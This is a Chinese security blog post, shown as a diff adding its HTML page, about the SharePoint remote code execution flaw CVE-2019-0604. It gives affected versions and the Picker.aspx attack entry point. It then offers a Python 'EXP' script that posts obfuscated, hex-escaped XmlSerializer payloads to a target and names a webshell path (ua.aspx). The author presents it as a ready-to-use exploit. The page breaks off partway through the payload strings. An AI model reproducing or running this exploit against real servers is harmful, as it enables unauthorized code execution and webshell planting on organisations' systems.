@@ -1,0 +1,468 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Exp,Tool,Code,GetShell">
+
+
+<meta name="description" content="漏洞信息
+Microsoft SharePoint是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    CVE-2019-0604 SharePoint GetShell Exploit |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="CVE-2019-0604 SharePoint GetShell Exploit">
+            
+            CVE-2019-0604 SharePoint GetShell Exploit
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Exp/">Exp</a> <a class="category-link" href="/categories/Tool/">工具</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/Code/" rel="tag">Code</a> <a class="tag-none-link" href="/tags/Exp/" rel="tag">Exp</a> <a class="tag-none-link" href="/tags/GetShell/" rel="tag">GetShell</a> <a class="tag-none-link" href="/tags/Tool/" rel="tag">Tool</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2019/12/03</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1964</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
+<p><span style="font-size: 16px;">Microsoft SharePoint是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。</span></p>
+<p><span style="font-size: 16px;">Microsoft SharePoint 远程代码执行漏洞（CVE-2019-0594、CVE-2019-0604，高危）：Microsoft SharePoint软件无法检查应用程序包源标记时触发该漏洞。攻击者可在SharePoint应用程序池和SharePoint服务器中执行任意代码。</span></p>
+<p><span style="font-size: 18px;"><strong>影响版本：</strong></span></p>
+<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">Microsoft SharePoint Enterprise Server 2016</span></div>
+<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">SharePoint Foundation 2013 SP1</span></div>
+<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">harePoint Server 2010 SP2</span></div>
+<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">SharePoint Server 2019。</span></div>
+<h2 id="h2-2"><span style="font-size: 18px;">攻击入口</span></h2>
+<p><span style="font-size: 16px;">ItemPicker Web 控件实际上从来没有在一个 .aspx 页面中使用过。但是看看它基类型的用法，EntityEditorWithPicker，说明在 /_layouts/15/Picker.aspx 应该有一个 Picker.aspx 文件使用了它。</span></p>
+<p><span style="font-size: 16px;">该页面要求使用选择器对话框的类型通过 URL 的 PickerDialogType 参数的形式提供。在这里，可以使用以下两种 ItemPickerDialog 类型中的任何一种：</span></p>
+<pre><span style="font-size: 16px;"><code class="hljs css">· <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.WebControls<span class="hljs-selector-class">.ItemPickerDialog <span class="hljs-selector-tag">in             <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.dll
+</span></span></span></span></span></span></span></span></code><p><code class="hljs css">· <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.Portal<span class="hljs-selector-class">.WebControls<span class="hljs-selector-class">.ItemPickerDialog <span class="hljs-selector-tag">in <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.Portal<span class="hljs-selector-class">.dll<br>
+</span></span></span></span></span></span></span></span></span></span></code></p></span></pre><p></p>
+<p><span style="font-size: 16px;">利用第一种 <span style="font-size: 16px;">PickerDialogType </span>类型</span></p>
+<p>&nbsp;</p>
+<h2 id="h2-3">PoC</h2>
+<p><span style="font-size: 16px;">当表单提交 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的值以 “__” 为开头时(类似于“_dummy”)，</span></p>
+<p><span style="font-size: 16px;">EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 处的断点将显示以下情况：而调用另外一种 ItemPickerDialog 类型时，函数调用栈只是在最上面的两个有所不同。</span></p>
+<p><span style="font-size: 16px;">这表明 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的数据最终出现在了 EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 中。 剩下的只需要拷贝实例 ID 和构造一个 XmlSerializer 的 payload 就可以了。</span></p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px;"><strong>补充：</strong></span></p>
+<p><span style="font-size: 16px;">作者说只要构造一个XML序列化的Payload就可以了，但是Payload提交到哪里呢？</span></p>
+<p><span style="font-size: 16px;">原文中只说了一半,完整POST以及具体参数如下：</span></p>
+<p><span style="font-size: 16px;">URL： /Picker.aspx?PickerDialogType=控件的程序集限定名&nbsp; <br></span></p>
+<p><span style="font-size: 16px;">参数： <span style="font-size: 16px;">ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=<span style="font-size: 16px;">payload </span></span></span></p>
+<p><span style="font-size: 16px;"><span style="font-size: 16px;">实际上还需访问<span style="font-size: 16px;">Picker.aspx</span>附带的其它参数，测试我不附带其它参数时提交表单是失败的。</span></span></p>
+<p>&nbsp;</p>
+<p><span style="font-size: 16px;">此漏洞分析文章出来时就想搭环境测试了，第一天下载APP安装后发现下错了<span style="font-size: 16px;">，</span></span></p>
+<p><span style="font-size: 16px;">加上项目未遇到该程序，搭环境也浪费时间懒得弄，就暂时丢一边了。</span></p>
+<p><span style="font-size: 16px;">今天发现上周已经弄了一半，又重新研究了一下。</span></p>
+<p>&nbsp;</p>
+<p><strong><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">详情请看原文，我想以下文章应该不少人看过了吧，所谓原理很多人都能说得出来</span></strong></p>
+<p><strong><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">就是都在等一个真正能用的EXP吧，哈哈哈，我就是传说中的云黑客“鸡你太美”！</span></strong></p>
+<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">原文(英文): <a href="https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability" target="_blank">https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability</a></span></p>
+<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">译文(中文): <a href="https://www.anquanke.com/post/id/173476" target="_blank">https://www.anquanke.com/post/id/173476</a></span></p>
+<p>&nbsp;</p>
+<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 18px;"><strong>EXP</strong></span></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#cve-2019-0604 SharePoint RCE exploit
+#date: 20190618 #author: <a href="https://www.cnblogs.com/k8gege" target="_blank">k8gege</a>
+import urllib
+import urllib2
+import sys
+import requests
+url0 = sys.argv[1]
+url1 = '/_layouts/15/Picker.aspx?PickerDialogType='
+url = url0 + url1 
+shellurl=url0+'/_layouts/15/ua.aspx'
+exp='\x63\x76\x65\x2D\x32\x30\x31\x39\x2D\x30\x36\x30\x34\x20\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x20\x52\x43\x45\x20\x65\x78\x70\x6C\x6F\x69\x74'
+paySpanData='\x63\x74\x6C\x30\x30\x24\x50\x6C\x61\x63\x65\x48\x6F\x6C\x64\x65\x72\x44\x69\x61\x6C\x6F\x67\x42\x6F\x64\x79\x53\x65\x63\x74\x69\x6F\x6E\x24\x63\x74\x6C\x30\x35\x24\x68\x69\x64\x64\x65\x6E\x53\x70\x61\x6E\x44\x61\x74\x61';
+paySection='\x50\x6C\x61\x63\x65\x48\x6F\x6C\x64\x65\x72\x44\x69\x61\x6C\x6F\x67\x42\x6F\x64\x79\x53\x65\x63\x74\x69\x6F\x6E'
+ct1='\x63\x74\x6C\x30\x30\x24'
+ct2='\x24\x63\x74\x6C\x30\x35'
+spver = '\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x2E\x57\x65\x62\x43\x6F\x6E\x74\x72\x6F\x6C\x73\x2E\x49\x74\x65\x6D\x50\x69\x63\x6B\x65\x72\x44\x69\x61\x6C\x6F\x67\x2C\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x2C\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x35\x2E\x30\x2E\x30\x2E\x30\x2C\x43\x75\x6C\x74\x75\x72\x65\x3D\x6E\x65\x75\x74\x72\x61\x6C\x2C\x50\x75\x62\x6C\x69\x63\x4B\x65\x79\x54\x6F\x6B\x65\x6E\x3D\x37\x31\x65\x39\x62\x63\x65\x31\x31\x31\x65\x39\x34\x32\x39\x63'
+uapay='\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74'
+payload1='\x5F\x5F\x62\x70\x38\x32\x63\x31\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x32\x30\x30\x33\x35\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x65\x32\x30\x30\x39\x34\x30\x30\x65\x36\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x65\x36\x30\x30\x31\x36\x30\x30\x63\x36\x30\x30\x65\x32\x30\x30\x35\x34\x30\x30\x38\x37\x30\x30\x30\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x34\x36\x30\x30\x37\x35\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x30\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x30\x36\x30\x30\x32\x33\x30\x30\x62\x35\x30\x30\x62\x35\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x37\x35\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x66\x36\x30\x30\x37\x37\x30\x30\x33\x37\x30\x30\x65\x32\x30\x30\x64\x34\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x62\x36\x30\x30\x35\x37\x30\x30\x30\x37\x30\x30\x65\x32\x30\x30\x38\x35\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x39\x36\x30\x30\x66\x36\x30\x30\x65\x36\x30\x30\x36\x34\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x37\x37\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x62\x36\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x36\x35\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x66\x36\x30\x30\x65\x36\x30\x30\x64\x33\x30\x30\x34\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x33\x34\x30\x30\x35\x37\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x35\x37\x30\x30\x32\x37\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x65\x36\x30\x30\x35\x36\x30\x30\x35\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x63\x36\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x30\x35\x30\x30\x35\x37\x30\x30\x32\x36\x30\x30\x63\x36\x30\x30\x39\x36\x30\x30\x33\x36\x30\x30\x62\x34\x30\x30\x35\x36\x30\x30\x39\x37\x30\x30\x34\x35\x30\x30\x66\x36\x30\x30\x62\x36\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x64\x33\x30\x30\x33\x33\x30\x30\x31\x33\x30\x30\x32\x36\x30\x30\x36\x36\x30\x30\x33\x33\x30\x30\x38\x33\x30\x30\x35\x33\x30\x30\x36\x33\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x33\x33\x30\x30\x36\x33\x30\x30\x34\x33\x30\x30\x35\x36\x30\x30\x33\x33\x30\x30\x35\x33\x30\x30\x64\x35\x30\x30\x63\x32\x30\x30\x62\x35\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x37\x35\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x66\x36\x30\x30\x37\x37\x30\x30\x33\x37\x30\x30\x65\x32\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x32\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30'
+payload2='\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x30\x32\x30\x30\x36\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x66\x36\x30\x30\x65\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x31\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x35\x37\x30\x30\x34\x37\x30\x30\x36\x36\x30\x30\x64\x32\x30\x30\x31\x33\x30\x30\x36\x33\x30\x30\x32\x32\x30\x30\x66\x33\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x63\x33\x30\x30\x35\x34\x30\x30\x38\x37\x30\x30\x30\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x34\x36\x30\x30\x37\x35\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x30\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x66\x34\x30\x30\x36\x36\x30\x30\x38\x35\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x61\x33\x30\x30\x38\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x38\x36\x30\x30\x34\x37\x30\x30\x34\x37\x30\x30\x30\x37\x30\x30\x61\x33\x30\x30\x66\x32\x30\x30\x66\x32\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x65\x32\x30\x30\x37\x37\x30\x30\x33\x33\x30\x30\x65\x32\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x37\x36\x30\x30\x66\x32\x30\x30\x32\x33\x30\x30\x30\x33\x30\x30\x30\x33\x30\x30\x31\x33\x30\x30\x66\x32\x30\x30\x38\x35\x30\x30\x64\x34\x30\x30\x63\x34\x30\x30\x33\x35\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x31\x36\x30\x30\x64\x32\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x61\x33\x30\x30\x38\x37\x30\x30\x33\x37\x30\x30\x34\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x38\x36\x30\x30\x34\x37\x30\x30\x34\x37\x30\x30\x30\x37\x30\x30\x61\x33\x30\x30\x66\x32\x30\x30\x66\x32\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x65\x32\x30\x30\x37\x37\x30\x30\x33\x33\x30\x30\x65\x32\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x37\x36\x30\x30\x66\x32\x30\x30\x32\x33\x30\x30\x30\x33\x30\x30\x30\x33\x30\x30\x31\x33\x30\x30\x66\x32\x30\x30\x38\x35\x30\x30\x64\x34\x30\x30\x63\x34\x30\x30\x33\x35\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x31\x36\x30\x30\x32\x32\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x63\x33\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x34\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x34\x37\x30\x30\x39\x37\x30\x30\x30\x33\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x63\x33\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x39\x34\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x61\x33\x30\x30\x34\x37\x30\x30\x39\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x38\x35\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x66\x32\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x63\x33\x30\x30\x64\x34\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x65\x34\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x65\x33\x30\x30\x30\x35\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30'
+payload3='\x61\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x62\x33\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x32\x36\x30\x30\x63\x36\x30\x30\x39\x37\x30\x30\x64\x33\x30\x30\x64\x36\x30\x30\x33\x37\x30\x30\x33\x36\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x63\x36\x30\x30\x39\x36\x30\x30\x32\x36\x30\x30\x32\x32\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x61\x33\x30\x30\x34\x34\x30\x30\x39\x36\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x33\x36\x30\x30\x63\x36\x30\x30\x32\x37\x30\x30\x64\x32\x30\x30\x65\x36\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x30\x37\x30\x30\x31\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x34\x34\x30\x30\x39\x36\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x65\x36\x30\x30\x66\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x39\x36\x30\x30\x33\x36\x30\x30\x33\x37\x30\x30\x62\x33\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x32\x36\x30\x30\x63\x36\x30\x30\x39\x37\x30\x30\x64\x33\x30\x30\x33\x37\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x32\x32\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x61\x33\x30\x30\x62\x34\x30\x30\x35\x36\x30\x30\x39\x37\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x63\x34\x30\x30\x31\x36\x30\x30\x35\x37\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x33\x34\x30\x30\x31\x36\x30\x30\x63\x36\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x35\x30\x30\x39\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x62\x37\x30\x30\x38\x37\x30\x30\x61\x33\x30\x30\x34\x35\x30\x30\x39\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x30\x32\x30\x30\x34\x34\x30\x30\x39\x36\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x61\x33\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x33\x37\x30\x30\x64\x37\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x64\x34\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x65\x34\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x34\x37\x30\x30\x32\x32\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x34\x30\x30\x3